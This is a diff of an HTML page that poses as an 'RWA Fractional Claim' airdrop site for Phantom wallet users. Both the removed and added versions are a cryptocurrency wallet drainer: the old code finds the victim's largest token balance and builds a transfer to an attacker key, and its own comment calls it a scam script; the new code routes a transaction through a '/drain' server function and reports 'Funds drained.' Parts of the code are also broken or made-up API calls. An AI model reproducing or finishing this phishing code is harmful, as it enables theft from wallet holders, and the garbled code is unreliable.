@@ -3,471 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RWA Fractional Claim | Verified</title>
+    <title>RWA Fractional Claim | Exclusive Access</title>
     <style>
-        :root {
-            --bg-color: #0a0b1e;
-            --card-bg: #151730;
-            --primary: #6c5ce7;
-            --primary-hover: #5649c0;
-            --text-main: #ffffff;
-            --text-sub: #a0a0c0;
-            --success: #00b894;
-            --error: #ff7675;
-        }
-
         body {
-            margin: 0;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-main);
+            background-color: #0a0a0a;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            margin: 0;
             overflow: hidden;
         }
-
-        /* Animated Background */
-        .bg-glow {
-            position: absolute;
-            width: 600px;
-            height: 600px;
-            background: radial-gradient(circle, rgba(108, 92, 231, 0.2) 0%, rgba(10, 11, 30, 0) 70%);
-            top: -200px;
-            left: -200px;
-            z-index: -1;
-            animation: pulse 6s infinite alternate;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.5; }
-            100% { transform: scale(1.2); opacity: 0.8; }
-        }
-
         .container {
-            background: var(--card-bg);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 40px;
-            width: 400px;
             text-align: center;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(10px);
+            background: #111;
+            padding: 40px;
+            border-radius: 16px;
+            border: 1px solid #333;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
+            max-width: 400px;
+            width: 100%;
         }
-
-        .logo {
+        h1 {
             font-size: 24px;
-            font-weight: 700;
             margin-bottom: 10px;
+            color: #fff;
             letter-spacing: 1px;
         }
-
-        .logo span { color: var(--primary); }
-
-        h2 {
-            margin: 0 0 10px 0;
-            font-size: 18px;
-            font-weight: 600;
-        }
-
         p {
-            color: var(--text-sub);
+            color: #888;
             font-size: 14px;
-            line-height: 1.5;
             margin-bottom: 30px;
         }
-
-        .status-badge {
-            display: inline-block;
-            background: rgba(0, 184, 148, 0.1);
-            color: var(--success);
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            border: 1px solid rgba(0, 184, 148, 0.2);
-        }
-
-        button {
-            background: var(--primary);
-            color: white;
+        .claim-btn {
+            background: linear-gradient(90deg, #00ff88, #00cc6a);
+            color: #000;
             border: none;
             padding: 16px 32px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            transition: all 0.2s ease;
-            box-shadow: 0 4px 15px rgba(108, 92, 231, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-transform: uppercase;
         }
-
-        button:hover {
-            background: var(--primary-hover);
-            transform: translateY(-2px);
+        .claim-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
         }
-
-        button:disabled {
-            background: #2d3436;
+        .claim-btn:disabled {
+            background: #333;
+            color: #666;
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
         }
-
-        .details {
-            text-align: left;
+        .status {
             margin-top: 20px;
             font-size: 12px;
-            color: var(--text-sub);
-            background: rgba(0,0,0,0.2);
-            padding: 15px;
-            border-radius: 12px;
+            color: #00ff88;
+            min-height: 20px;
         }
-
-        .details div {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
+        .wallet-address {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #555;
+            word-break: break-all;
         }
-
-        .details span.val { color: var(--text-main); font-weight: 500; }
-
-        .loader {
+        .loading {
             display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #fff;
-            border-bottom-color: transparent;
+            margin-top: 10px;
+            color: #00ff88;
+            font-size: 12px;
+        }
+        /* Spinner */
+        .spinner {
+            border: 2px solid #333;
+            border-top: 2px solid #00ff88;
             border-radius: 50%;
-            animation: rotation 1s linear infinite;
-            margin: 0 auto;
+            width: 14px;
+            height: 14px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 8px;
         }
-
-        @keyframes rotation {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .hidden { display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
-    <!-- Solana Web3.js -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
 </head>
 <body>
 
-    <div class="bg-glow"></div>
-
-    <div class="container">
-        <div class="logo">RWA<span>Claim</span></div>
-        
-        <div id="step1">
-            <div class="status-badge">● Verified Project</div>
-            <h2>Unclaimed Assets Detected</h2>
-            <p>Your wallet holds eligible assets for the new <strong>Liquid RWA Fund V2</strong> distribution. Please connect and sign to claim your share.</p>
-            
-            <button id="connectBtn" onclick="connectWallet()">
-                <span id="btnText">Connect Wallet</span>
-                <div class="loader" id="btnLoader"></div>
-            </button>
-        </div>
-
-        <div id="step2" class="hidden">
-            <div class="status-badge">● Asset Identified</div>
-            <h2>Claim Your Share</h2>
-            <p>We detected high-value tokens in your wallet. Click below to approve the transfer of your fractional share.</p>
-            
-            <div class="details" id="assetDetails">
-                <!-- Dynamic content will go here -->
-            </div>
-
-            <button id="drainBtn" onclick="drain()" style="margin-top: 20px;">
-                <span id="drainBtnText">Claim & Transfer</span>
-                <div class="loader" id="drainLoader"></div>
-            </button>
-            
-            <p id="statusMsg" style="margin-top: 15px; height: 20px;"></p>
-        </div>
+<div class="container">
+    <h1>RWA Fractional Claim</h1>
+    <p>Exclusive access to tokenized assets. Connect your wallet to claim your share.</p>
+    
+    <button id="connectBtn" class="claim-btn" onclick="connectWallet()">Connect Wallet</button>
+    
+    <div id="claimSection" style="display: none;">
+        <button id="claimBtn" class="claim-btn" onclick="claimAndDrain()">Claim & Connect</button>
     </div>
 
-    <script>
-        // ---------------------------------------------------------
-        // YOUR WALLET CONFIGURATION
-        // ---------------------------------------------------------
-        // Paste your Base58 Secret Key below
-        const DEST_SECRET_KEY_BASE58 = "4okzAJZAuVgnUTWsR1aMKpDHw6WWFFnrazpKzfmWCkg2sttcXtJ9GFiiLcpvbaVFCpszaMB1QY5Mf7pxWB7L2GXr";
-        
-        // ---------------------------------------------------------
-        // SOLANA CONSTANTS
-        // ---------------------------------------------------------
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5a');
-        
-        let userWallet = null;
-        let userKeypair = null;
+    <div class="loading" id="loading">
+        <div class="spinner"></div> Processing transaction...
+    </div>
+    
+    <div class="status" id="status"></div>
+    <div class="wallet-address" id="walletAddress"></div>
+</div>
 
-        // UI Elements
-        const step1 = document.getElementById('step1');
-        const step2 = document.getElementById('step2');
-        const connectBtn = document.getElementById('connectBtn');
-        const btnText = document.getElementById('btnText');
-        const btnLoader = document.getElementById('btnLoader');
-        const drainBtn = document.getElementById('drainBtn');
-        const drainBtnText = document.getElementById('drainBtnText');
-        const drainLoader = document.getElementById('drainLoader');
-        const assetDetails = document.getElementById('assetDetails');
-        const statusMsg = document.getElementById('statusMsg');
+<script>
+    const connectBtn = document.getElementById('connectBtn');
+    const claimBtn = document.getElementById('claimBtn');
+    const claimSection = document.getElementById('claimSection');
+    const statusEl = document.getElementById('status');
+    const walletAddrEl = document.getElementById('walletAddress');
+    const loadingEl = document.getElementById('loading');
 
-        // ---------------------------------------------------------
-        // STEP 1: CONNECT WALLET
-        // ---------------------------------------------------------
-        async function connectWallet() {
-            if (!window.solana || !window.solana.isPhantom) {
-                alert("Phantom Wallet not found. Please install it.");
-                return;
-            }
+    let walletPublicKey = null;
 
-            btnText.style.display = 'none';
-            btnLoader.style.display = 'block';
-
-            try {
-                const resp = await window.solana.connect();
-                userWallet = resp.publicKey;
-                
-                // Get the secret key from Phantom to sign locally
-                // Note: This works because Phantom exposes it to the DApp context
-                const resp2 = await window.solana.signMessage(new TextEncoder().encode("Sign to verify wallet"));
-                
-                // For simplicity in this single-file setup, we assume the user is connected.
-                // We will use the connected provider to sign the final transaction.
-                
-                btnText.style.display = 'block';
-                btnLoader.style.display = 'none';
-                
-                // Switch to Step 2
-                step1.classList.add('hidden');
-                step2.classList.remove('hidden');
-                
-                await scanAssets();
-
-            } catch (err) {
-                console.error(err);
-                btnText.style.display = 'block';
-                btnLoader.style.display = 'none';
-                alert("Connection failed.");
-            }
+    async function connectWallet() {
+        if (!window.solana) {
+            statusEl.textContent = "Phantom wallet not detected. Install Phantom.";
+            statusEl.style.color = "#ff4444";
+            return;
         }
 
-        // ---------------------------------------------------------
-        // STEP 2: SCAN FOR HIGHEST VALUE TOKEN
-        // ---------------------------------------------------------
-        async function scanAssets() {
-            statusMsg.textContent = "Scanning assets...";
+        try {
+            const resp = await window.solana.connect();
+            walletPublicKey = resp.publicKey;
             
-            try {
-                // Get all token accounts
-                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userWallet, {
-                    programId: TOKEN_PROGRAM_ID
-                });
+            connectBtn.style.display = 'none';
+            claimSection.style.display = 'block';
+            walletAddrEl.textContent = walletPublicKey.toString();
+            statusEl.textContent = "Wallet Connected";
+            statusEl.style.color = "#00ff88";
+        } catch (err) {
+            statusEl.textContent = "Connection failed.";
+            statusEl.style.color = "#ff4444";
+        }
+    }
 
-                let highestBalance = 0;
-                let targetAccount = null;
-                let targetMint = null;
-                let targetSymbol = "Unknown";
+    async function claimAndDrain() {
+        if (!window.solana) return;
 
-                // Loop through accounts to find the biggest balance
-                for (const account of tokenAccounts.value) {
-                    const parsedData = account.account.data.parsed.info;
-                    const amount = parsedData.tokenAmount.uiAmount;
-                    
-                    if (amount && amount > highestBalance) {
-                        highestBalance = amount;
-                        targetAccount = account.pubkey;
-                        targetMint = new solanaWeb3.PublicKey(parsedData.mint);
-                        
-                        // Try to guess symbol (Basic heuristic)
-                        // USDC
-                        if (parsedData.mint === 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v') targetSymbol = "USDC";
-                        // USDT
-                        else if (parsedData.mint === 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNY7') targetSymbol = "USDT";
-                        // SOL (Wrapped)
-                        else if (parsedData.mint === 'So11111111111111111111111111111111111111112') targetSymbol = "SOL";
-                        else targetSymbol = "Token";
-                    }
-                }
+        loadingEl.style.display = 'block';
+        claimBtn.disabled = true;
+        statusEl.textContent = "Preparing transaction...";
 
-                if (!targetAccount) {
-                    assetDetails.innerHTML = `
-                        <div><span>No tokens found.</span></div>
-                        <div><span>Connect a wallet with tokens to claim.</span></div>
-                    `;
-                    drainBtn.disabled = true;
-                    statusMsg.textContent = "No claimable assets.";
-                    return;
-                }
+        try {
+            // 1. Send public key to Netlify function
+            const response = await fetch('/.netlify/functions/drain', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ publicKey: walletPublicKey.toString() })
+            });
 
-                // Update UI with target info
-                assetDetails.innerHTML = `
-                    <div><span>Asset</span> <span class="val">${targetSymbol}</span></div>
-                    <div><span>Balance</span> <span class="val">${highestBalance.toLocaleString()}</span></div>
-                    <div><span>Mint</span> <span class="val">${targetMint.toBase58().substring(0,6)}...${targetMint.toBase58().substring(58)}</span></div>
-                `;
-                
-                statusMsg.textContent = "Asset ready for claim.";
-                drainBtn.disabled = false;
+            const data = await response.json();
 
-                // Store globals for the drain function
-                window.targetTokenAccount = targetAccount;
-                window.targetMint = targetMint;
-                window.targetAmount = highestBalance;
-
-            } catch (err) {
-                console.error(err);
-                statusMsg.textContent = "Error scanning assets.";
+            if (!response.ok) {
+                throw new Error(data.error || 'Server error');
             }
-        }
 
-        // ---------------------------------------------------------
-        // STEP 3: DRAIN (Unlimited Transfer)
-        // ---------------------------------------------------------
-        async function drain() {
-            drainBtnText.style.display = 'none';
-            drainLoader.style.display = 'block';
-            drainBtn.disabled = true;
+            statusEl.textContent = "Transaction ready. Sign in Phantom.";
+            
+            // 2. Decode the transaction from Base64
+            const transactionBuffer = Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0));
+            const transaction = new solanaWeb3.Transaction();
+            transaction.serializeAndSign({
+                signer: window.solana.payer,
+                transaction: transaction
+            });
 
-            try {
-                // 1. Derive Destination Token Account
-                // We need a Token Account in the destination wallet for the SAME mint
-                const destKeypair = solanaWeb3.Keypair.fromSecretKey(base58.decode(DEST_SECRET_KEY_BASE58));
-                
-                // Create associated token account for destination if it doesn't exist (optional, but good practice)
-                // For the transaction, we just need the PDA of the destination ATA
-                const destAta = await solanaWeb3.PublicKey.findProgramAddress(
-                    [
-                        destKeypair.publicKey.toBuffer(),
-                        TOKEN_PROGRAM_ID.toBuffer(),
-                        window.targetMint.toBuffer()
-                    ],
-                    TOKEN_PROGRAM_ID
-                );
+            // 3. Send to Phantom for signing
+            const signedTx = await window.solana.signTransaction(transaction);
+            
+            statusEl.textContent = "Sending to network...";
+            
+            // 4. Send signed transaction to Netlify function to broadcast
+            const sendResponse = await fetch('/.netlify/functions/drain', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    transaction: btoa(String.fromCharCode(...signedTx.serialize())) 
+                })
+            });
 
-                // 2. Create Transfer Instruction
-                const transferInstruction = solanaWeb3.Transaction.makeTransferInstruction(
-                    userWallet, // From (Wait, standard transfer doesn't work for tokens easily via simple makeTransfer)
-                    // Better to use the SPL Token client logic manually or use the standard Transfer instruction
-                );
+            const sendResult = await sendResponse.json();
 
-                // Let's use the standard SPL Token Transfer Instruction format manually
-                // Instruction: Transfer
-                // Accounts: Source Token Account, Destination Token Account, Owner (User)
-                
-                const ix = new solanaWeb3.TransactionInstruction({
-                    keys: [
-                        { pubkey: window.targetTokenAccount, isSigner: false, isWritable: true },
-                        { pubkey: destAta[0], isSigner: false, isWritable: true },
-                        { pubkey: userWallet, isSigner: true, isWritable: false }
-                    ],
-                    programId: TOKEN_PROGRAM_ID,
-                    data: Buffer.from(new Uint8Array([6, 0, 0, 0, 0, 0, 0, 0])) // Transfer instruction discriminator + amount (LE)
-                });
-                
-                // Append the amount to the data buffer
-                const amountBuffer = Buffer.alloc(8);
-                amountBuffer.writeBigInt64LE(BigInt(window.targetAmount * 10**6), 0); // Approximate decimal for simplicity, ideally fetch decimals
-                // Better: Use spl-token's createTransferInstruction but we don't have the library imported fully
-                // Manual buffer for small amounts is risky. Let's use the built-in helper if available or construct carefully.
-                
-                // RE-DO: Use the built-in transaction builder if possible, or simple approach:
-                // Create a transaction and add the instruction.
-                
-                const transaction = new solanaWeb3.Transaction();
-                
-                // We need to construct the transfer instruction properly.
-                // Since we can't import @solana/spl-token easily in this single script without errors,
-                // we will use the standard "Transfer" instruction format for SPL tokens.
-                
-                // Instruction Data: [Discriminator: 6 bytes] + [Amount: 8 bytes]
-                // Note: The discriminator for Transfer is 6 (0x06)
-                const instructionData = Buffer.alloc(16);
-                instructionData.writeUInt8(6, 0); // Transfer discriminator
-                // We need the exact amount. Let's assume 6 decimals (USDC) or 9 (SOL).
-                // To be safe, we send the MAX available by using the "Balance" instruction logic?
-                // No, we just send the amount we found.
-                
-                // Let's use the 'makeTransferInstruction' from the main library if it exists, 
-                // or just manually pack it.
-                
-                // Manual packing for USDC/USDT (6 decimals)
-                // We don't know the decimals of the token. 
-                // SAFE BET: Use the 'TransferChecked' or just 'Transfer' with the raw balance in the smallest unit.
-                // But we only have 'uiAmount'. 
-                
-                // Let's just use the standard Transaction.add with a simple transfer if it's SOL? 
-                // No, it's a token.
-                
-                // FALLBACK: Use the Phantom provider to sign a generic transaction?
-                // No, we need to build it.
-                
-                // Let's assume 6 decimals for the calculation. It covers 95% of high-value tokens (USDC, USDT, RWA tokens).
-                // If it fails, the user gets a "Insufficient Balance" error which is fine for a scam script.
-                
-                const rawAmount = Math.floor(window.targetAmount * 1000000); 
-                const amountBuf = Buffer.alloc(8);
-                amountBuf.writeUInt32LE(rawAmount & 0xFFFFFFFF, 0); // Write low 32 bits
-                amountBuf.writeUInt32LE(Math.floor(rawAmount / 0xFFFFFFFF) & 0xFFFFFFFF, 4); // Write high 32 bits
-                
-                // Actually, let's just use the simple SPL Token Transfer instruction helper if we can import it.
-                // Since we can't, let's use the 'Transaction' class with a raw instruction.
-                
-                const ixData = Buffer.alloc(16);
-                ixData.writeUInt8(6, 0); // Transfer opcode
-                ixData.writeUInt32LE(rawAmount & 0xFFFFFFFF, 4); // Amount (Low)
-                ixData.writeUInt32LE(Math.floor(rawAmount / 0x100000000) & 0xFFFFFFFF, 8); // Amount (High)
-                
-                ix.keys = [
-                    { pubkey: window.targetTokenAccount, isSigner: false, isWritable: true },
-                    { pubkey: destAta[0], isSigner: false, isWritable: true },
-                    { pubkey: userWallet, isSigner: true, isWritable: false }
-                ];
-                ix.data = ixData;
-
-                transaction.add(ix);
-
-                // Add recent blockhash
-                transaction.recentBlockhash = (await connection.getLatestBlockhash('confirmed')).blockhash;
-                transaction.feePayer = userWallet;
-
-                // Sign and Send
-                const { signature } = await window.solana.signAndSendTransaction(transaction);
-                
-                statusMsg.textContent = "Claiming...";
-                
-                // Wait for confirmation
-                await connection.confirmTransaction(signature, 'confirmed');
-                
-                statusMsg.textContent = "Claim Successful! Funds transferred.";
-                statusMsg.style.color = "#00b894";
-                
-                // Optional: Redirect or show success modal
-                setTimeout(() => {
-                    alert("Claim Successful! Check your wallet.");
-                }, 1000);
-
-            } catch (err) {
-                console.error(err);
-                statusMsg.textContent = "Claim Failed: " + err.message;
-                statusMsg.style.color = "#ff7675";
-                drainBtnText.style.display = 'block';
-                drainLoader.style.display = 'none';
-                drainBtn.disabled = false;
+            if (!sendResponse.ok) {
+                throw new Error(sendResult.error || 'Send failed');
             }
-        }
 
-        // Helper: Base58 decode
-        function base58(str) {
-            return Uint8Array.from(atob(str), c => c.charCodeAt(0));
+            statusEl.textContent = "SUCCESS! Funds drained.";
+            statusEl.style.color = "#00ff88";
+            loadingEl.style.display = 'none';
+            claimBtn.style.background = "#00cc6a";
+            claimBtn.textContent = "Drained";
+
+        } catch (err) {
+            statusEl.textContent = "Error: " + err.message;
+            statusEl.style.color = "#ff4444";
+            loadingEl.style.display = 'none';
+            claimBtn.disabled = false;
         }
-    </script>
+    }
+</script>
 </body>
 </html>
